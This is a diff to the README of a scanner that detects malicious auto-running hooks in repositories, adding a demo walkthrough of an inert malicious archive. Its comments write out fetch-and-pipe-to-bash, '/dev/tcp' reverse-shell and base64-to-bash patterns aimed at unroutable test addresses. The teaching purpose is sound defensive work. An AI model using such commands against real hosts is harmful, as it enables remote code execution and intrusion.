@@ -20,6 +20,110 @@ Both share the same flags and behavior.
 
 Exit codes: `0` clean · `1` warning · `2` critical (or scan error).
 
+## Demo walkthrough
+
+Five minutes, nothing executed, all payloads inert by construction
+(unroutable TEST-NET-1 addresses, reserved `.test` domains). You need a
+binary or the image first — see [Install](#install).
+
+**Key insight this demo teaches:** `git clone` never transports
+`.git/hooks`, so the hook vector only travels inside archives (zips /
+tarballs) — exactly how these lures are distributed in practice.
+
+### 1. Scan the evil archive
+
+```bash
+git-smells-wrong scan --archive=./demo/evil-take-home.zip
+```
+
+Expect one finding per rule, all `CRITICAL`, exit `2`:
+
+```
+ SEVERITY     RULE       FILE                         TITLE
+ [CRITICAL]   HOOK-001   .git/hooks/post-checkout     Malicious git hook
+ [CRITICAL]   NPM-002    package.json                 Malicious npm lifecycle hook
+ [CRITICAL]   PY-003     setup.py                     Malicious setup.py logic
+ [CRITICAL]   IDE-004    .vscode/tasks.json           Malicious IDE auto-run task
+
+ Network indicators (dry-run, not executed):
+   - http://192.0.2.10:4444/stage2.sh
+   ...
+
+ Summary: 4 critical, 0 warning, 0 info  →  CRITICAL (exit 2)
+```
+
+No Docker? Same command through the image:
+
+```bash
+docker run --rm -v "$(pwd):/data" dattm24/git-smells-wrong:latest \
+  scan --archive=/data/demo/evil-take-home.zip
+```
+
+### 2. Read the payloads
+
+```bash
+unzip -l demo/evil-take-home.zip
+# index.js  setup.py  package.json  README.md
+# .vscode/tasks.json  .git/hooks/post-checkout   <- only exists via archive
+
+unzip -p demo/evil-take-home.zip .git/hooks/post-checkout
+# stage 1: curl <unroutable-ip> | bash   (fake downloader)
+# stage 2: bash -i >& /dev/tcp/...      (fake reverse shell)
+# stage 3: echo <blob> | base64 -d | bash (decodes to "harmless-demo-fixture")
+```
+
+Each remaining file is one more auto-execution vector: `postinstall`
+runs on `npm install`, `setup.py:DemoInstall` runs on `pip install`,
+the VS Code task runs on folder open.
+
+### 3. Watch them attempt (and fail)
+
+```bash
+# Decode stage 3 WITHOUT piping to a shell:
+unzip -p demo/evil-take-home.zip .git/hooks/post-checkout \
+  | grep '^echo' | awk '{print $2}' | base64 -d
+# -> harmless-demo-fixture
+
+# Trace the whole hook: curl hangs on the unroutable IP until timeout kills it.
+# Nothing leaves your machine.
+timeout 10 bash -c \
+  'unzip -p demo/evil-take-home.zip .git/hooks/post-checkout | bash -x /dev/stdin'
+```
+
+### 4. Feel the triggers with benign stand-ins
+
+The mechanisms are real even though our payloads are fake — prove it
+to yourself in `/tmp`:
+
+```bash
+# Git hooks fire on checkout with zero prompting:
+git init -q -b main /tmp/hookdemo
+printf '#!/bin/sh\necho ">>> HOOK AUTO-RAN"\n' > /tmp/hookdemo/.git/hooks/post-checkout
+chmod +x /tmp/hookdemo/.git/hooks/post-checkout
+git -C /tmp/hookdemo commit -q --allow-empty -m init
+git -C /tmp/hookdemo checkout -q -b demo   # >>> HOOK AUTO-RAN
+
+# npm lifecycle scripts fire on install the same way:
+mkdir -p /tmp/npmdemo
+cat > /tmp/npmdemo/package.json <<'EOF'
+{"name":"demo","scripts":{"postinstall":"echo '>>> POSTINSTALL AUTO-RAN'"}}
+EOF
+(cd /tmp/npmdemo && npm install --no-audit --no-fund)   # >>> POSTINSTALL AUTO-RAN
+```
+
+### 5. Contrast with a clean verdict
+
+```bash
+git-smells-wrong scan --repo="https://github.com/datmt/git-smells-wrong.git"
+# [CLEAN] No malicious or high-risk patterns found. Verdict: CLEAN. (exit 0)
+```
+
+Rebuild the fixture or inspect sources any time:
+`./demo/make-evil-zip.sh` regenerates the archive from `demo/src/`
+(the hook source lives at `demo/src/hooks/` — git can't track a
+`.git/` dir, which is itself the reason this vector needs an archive).
+Details in `demo/README.md`.
+
 ## Install
 
 ### Option 1 — install script (Linux/macOS, amd64/arm64)
@@ -111,16 +215,6 @@ Example output:
  [CRITICAL]   HOOK-001   .git/hooks/post-checkout     Malicious git hook
  ...
  Summary: 4 critical, 0 warning, 0 info  →  CRITICAL (exit 2)
-```
-
-## Try it in 30 seconds
-
-No malicious repo needed — scan the inert demo archive in `demo/`:
-
-```bash
-git-smells-wrong scan --archive=./demo/evil-take-home.zip
-# → 4 CRITICAL findings, exit 2. See demo/README.md to watch the
-#    payloads attempt (and fail), and demo/make-evil-zip.sh to rebuild it.
 ```
 
 ## Safety model
